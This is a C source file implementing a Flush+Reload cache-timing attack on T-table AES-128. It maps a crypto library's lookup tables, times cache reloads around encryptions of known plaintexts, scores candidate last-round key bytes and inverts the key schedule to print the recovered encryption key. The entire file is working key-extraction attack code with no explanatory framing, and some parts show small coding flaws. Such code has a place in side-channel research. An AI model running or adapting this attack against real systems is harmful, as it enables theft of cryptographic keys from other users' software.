#include <last_round_attack.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>

/**
 * Util Function -- Start
 */
static void string_to_hex(U8 *pIn, unsigned int pInLen, U8 *pOut)
{
    unsigned int i, j;
    unsigned int mul;
    char data = 0;

    for(i=0, j=0; i<pInLen; i++) {
        if(i % 2 == 0)
            mul = 16;
        else
            mul = 1;

        if(pIn[i] >= '0' && pIn[i] <= '9')
            data += ((pIn[i] - 48) * mul);
        else if(pIn[i] >= 'a' && pIn[i] <= 'f')
            data += ((pIn[i] - 87) * mul);
        else if(pIn[i] >= 'A' && pIn[i] <= 'F')
            data += ((pIn[i] - 55) * mul);
        else
            return;

        if(mul == 1)
        {
            pOut[j] = data;
            data = 0;
            j++;
        }
    }
}
/**
 * Util Function -- End
 */

 
/**
 * Intialize/Finalize Function -- Start
 */
static int map_crypto_library(struct last_round_attack_ctx *ctx)
{
	struct stat filestat;
	struct last_round_attack_args *args = &ctx->args;
	struct last_round_attack_cache_ctx *cache_ctx = &ctx->cache_ctx;
	
	/* Open file */
	cache_ctx->crypto_lib_fd = open(args->crypto_lib, O_RDONLY);
	if (cache_ctx->crypto_lib_fd == -1) {
		printf("Could not open file: %s\n", args->crypto_lib);
		return -1;
	}
	
    if (fstat(cache_ctx->crypto_lib_fd, &filestat) == -1) {
		printf("Could not obtain file information.\n");
		goto out;
    }
	
	cache_ctx->crypto_lib_size = filestat.st_size;
	cache_ctx->crypto_lib_addr = (U8*)mmap(0, cache_ctx->crypto_lib_size, PROT_READ, MAP_SHARED, cache_ctx->crypto_lib_fd, 0);
	if (cache_ctx->crypto_lib_addr == NULL) {
		fprintf(stderr, "Could not map file: %s\n", args->crypto_lib);
		return -1;
	}
	
	cache_ctx->state_te4 = (unsigned int*)(cache_ctx->crypto_lib_addr + args->off_te4);
	cache_ctx->state_rcon = (unsigned int*)(cache_ctx->crypto_lib_addr + args->off_rcon);
	
	return 0;
	
out:
	close(cache_ctx->crypto_lib_fd);
	return -1;
}

static void unmap_crypto_library(struct last_round_attack_ctx *ctx)
{
	struct last_round_attack_cache_ctx *cache_ctx = &ctx->cache_ctx;
	
	if(munmap(cache_ctx->crypto_lib_addr, cache_ctx->crypto_lib_size) == -1) {
		printf("munmap error : %s\n", strerror(errno));
	}

	if(close(cache_ctx->crypto_lib_fd) == -1) {
		printf("close error : %s\n", strerror(errno));
	}
}

static int read_plains(struct last_round_attack_ctx *ctx)
{
	FILE *fp = NULL;
	U8 tmp[33] = {0,};
	int i, j, plain_text_cnt;
	
	fp = fopen(ctx->args.plaintext_file, "r");
	if(!fp) {
		printf("Could not open file: %s\n", ctx->args.plaintext_file);
		return -1;
	}
	
	fscanf(fp, "%d\n", &plain_text_cnt);
	if(plain_text_cnt > ctx->args.plain_text_cnt)
		plain_text_cnt = ctx->args.plain_text_cnt;
	
	printf("plain_text_cnt : %d\n", plain_text_cnt);
	
	for(i=0; i<plain_text_cnt; i++) {
		memset(tmp, 0, sizeof(tmp));
		fscanf(fp, "%s\n", tmp);
		
		if(strlen(tmp) != 32) {
			printf("plaintext error!!\n");
			return;
		}
		
		string_to_hex(tmp, strlen(tmp), ctx->cache_ctx.plains[i]);
	}
	fclose(fp);
	
	return 0;
}

static void init_arrays(struct last_round_attack_ctx *ctx)
{
	memset(ctx->cache_ctx.score, 0, sizeof(ctx->cache_ctx.score));
}

static int cache_ctx_init(struct last_round_attack_ctx *ctx)
{
	int r;
	
	/* 1. Map crypto library */
	r = map_crypto_library(ctx);
	if(r)
		return r;
	
	/* 2. Initialize libflush */
	libflush_init(&(ctx->cache_ctx.libflush_session), NULL);
	
	/* 3. Read random plaintexts */
	r = read_plains(ctx);
	if(r)
		return r;
	
	/* 4. Init arrays */
	init_arrays(ctx);
	
	return 0;
}
/**
 * Intialize Function -- End
 */
 
/**
 * Attack Function -- Start
 */

static inline unsigned int get_te_value(struct last_round_attack_ctx *ctx, int idx)
{
	return *(ctx->cache_ctx.state_te4 + idx);
}

static inline unsigned int get_rcon_value(struct last_round_attack_ctx *ctx, int idx)
{
	return *(ctx->cache_ctx.state_rcon + idx);
}
 
static inline int reload_and_is_access(libflush_session_t *session, void *addr, int threshold)
{
	uint64_t count;

	count = libflush_reload_address(session, addr);
	if(count < threshold)
		return 1;
	return 0;
}

static inline void flush_te(libflush_session_t *session, void *addr)
{
	libflush_flush(session, addr);
}

/* calcuate score */
static void calc_score(struct last_round_attack_ctx *ctx)
{
	int word_cnt = ctx->args.cache_line_size / sizeof(unsigned int);
	int plain_text_cnt = ctx->args.plain_text_cnt;
	int threshold = ctx->args.cpu_cycle_threshold;
	struct last_round_attack_cache_ctx *cache_ctx = &ctx->cache_ctx;

	int i, j, s, p, max, best;
	unsigned int val_word;
	U8 val;
	U8 enc[AES128_KEY_LEN];
	int access_table_s[T_TABLE_ENTRIES];	/* access table for T[s[i]] */

	for(p=0; p<plain_text_cnt; p++) {
		/* 0. Clear arrays */
		memset(access_table_s, 0, sizeof(access_table_s));

		for(s=0; s<T_TABLE_ENTRIES; s++) {
			/* 1. Flush */
			flush_te(cache_ctx->libflush_session, (void*)(cache_ctx->state_te4 + s));

			/* 2. Do encryption */
			ctx->encrypt(cache_ctx->plains[p], enc, sizeof(enc));

			/* 3. Record T table access */
			access_table_s[s] = reload_and_is_access(cache_ctx->libflush_session, (void*)(cache_ctx->state_te4 + s), threshold);
		}

		/* 4. Increase counter */
		for(i=0; i<AES128_KEY_LEN; i++) {	/* for all `Ki */
			for(s=0; s<T_TABLE_ENTRIES; s++) {
				if(access_table_s[s] == 1) {
					val_word = *(cache_ctx->state_te4 + s);
					val = ((U8*)&val_word)[i%4];
					cache_ctx->score[i][enc[i] ^ val] += 1;	/* increase candidate score!! */
				}
			}
		}

		/* 5. Print progress */
		if(p % 50 == 0)
			printf("progress : %d / %d\n", p, plain_text_cnt);
	}
}

/* predict last round key by final score!! */
static void predict_last_round_key(struct last_round_attack_ctx *ctx)
{
	int ki;
	unsigned int kbyte, best;
	unsigned int max = 0;
	
	U8 *out_key = ctx->result.predict_key;
	struct last_round_attack_cache_ctx *cache_ctx = &ctx->cache_ctx;
	
	for(ki=0; ki<AES128_KEY_LEN; ki++) {
		max = 0;
		
		for(kbyte=0; kbyte<KEYBYTES; kbyte++) {
			if(cache_ctx->score[ki][kbyte] > max) {
				max = cache_ctx->score[ki][kbyte];
				best = kbyte;
			}
		}
		
		out_key[ki] = best;
	}

	printf("predict last round key : ");
	for(ki=0; ki<AES128_KEY_LEN; ki++)
		printf("%02x", out_key[ki]);
	printf("\n");
}

# define GETU32(pt) (((unsigned int)(pt)[0] << 24) ^ ((unsigned int)(pt)[1] << 16) ^ ((unsigned int)(pt)[2] <<  8) ^ ((unsigned int)(pt)[3]))
# define PUTU32(ct, st) { (ct)[0] = (U8)((st) >> 24); (ct)[1] = (U8)((st) >> 16); (ct)[2] = (U8)((st) >>  8); (ct)[3] = (U8)(st); }

static void invert_round_key(struct last_round_attack_ctx *ctx)
{
	int r = 9, i;
	unsigned int dst, src;
	U8 prev_round_key[AES128_KEY_LEN];
	U8 curr_round_key[AES128_KEY_LEN];

	memcpy(curr_round_key, ctx->result.predict_key, sizeof(curr_round_key));	/* start - last round key */
	printf("invert round key!!\n");

	while(r >= 0) {
		/* invert K(r)[4] ~ K(r)[15] first, by using K(r+1) */
		/* K(r)[i] = K(r+1)[i] ^ K(r+1)[i-4].  i=[4,...,15] */
		for(i=4; i<AES128_KEY_LEN; i++)
			prev_round_key[i] = curr_round_key[i] ^ curr_round_key[i-4];

		/* invert K(r)[0] - word-0 */
		/* K(r)[0] = K(r+1)[0] ^ (Te4[K(r)[13]] & 0xff000000) 
							   ^ (Te4[K(r)[14]] & 0x00ff0000)
							   ^ (Te4[K(r)[15]] & 0x0000ff00)
							   ^ (Te4[K(r)[12]] & 0x000000ff)
							   ^ rcon[r]
		 */
		src = GETU32(curr_round_key);
		dst = src ^ (get_te_value(ctx, prev_round_key[13]) & 0xff000000) \
								^ (get_te_value(ctx, prev_round_key[14]) & 0x00ff0000) \
								^ (get_te_value(ctx, prev_round_key[15]) & 0x0000ff00) \
								^ (get_te_value(ctx, prev_round_key[12]) & 0x000000ff) ^ get_rcon_value(ctx, r);
		PUTU32(prev_round_key, dst);

		/* iteration */
		r--;
		memcpy(curr_round_key, prev_round_key, sizeof(prev_round_key));
	}

	printf("first key : ");
	for(i=0; i<AES128_KEY_LEN; i++)
		printf("%02x", curr_round_key[i]);
	printf("\n");

	memcpy(ctx->result.predict_key, curr_round_key, sizeof(curr_round_key));
}

/**
 * Attack Function -- End
 */

/**
 * Exported API functions - Start
 */
int last_round_attack_init(struct last_round_attack_ctx *ctx)
{
	memset(&ctx->result, 0, sizeof(ctx->result));
	return cache_ctx_init(ctx);
}

void last_round_attack_do_attack(struct last_round_attack_ctx *ctx)
{
	/* 1. Calculate score */
	calc_score(ctx);
	
	/* 2. Predict last round key */
	predict_last_round_key(ctx);

	/* 3. Invert from last round key to real key */
	invert_round_key(ctx);
}

void last_round_attack_finalize(struct last_round_attack_ctx *ctx)
{
	libflush_terminate(ctx->cache_ctx.libflush_session);
	unmap_crypto_library(ctx);
}
/**
 * Exported API functions - End
 */